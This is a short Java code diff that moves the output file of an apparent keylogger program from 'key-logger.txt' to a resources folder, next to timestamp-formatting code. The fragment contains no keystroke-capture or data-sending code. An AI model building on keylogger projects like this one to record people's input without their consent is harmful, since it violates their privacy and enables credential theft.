@@ -17,7 +17,7 @@ public class Main {
 
         boolean running = true;
         try {
-            FileWriter fWriter = new FileWriter("key-logger.txt");
+            FileWriter fWriter = new FileWriter("src/main/resources/key-logger.txt");
             LocalDateTime timeLocal = LocalDateTime.now();
             DateTimeFormatter formatter1 = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
             String time = timeLocal.format(formatter1);
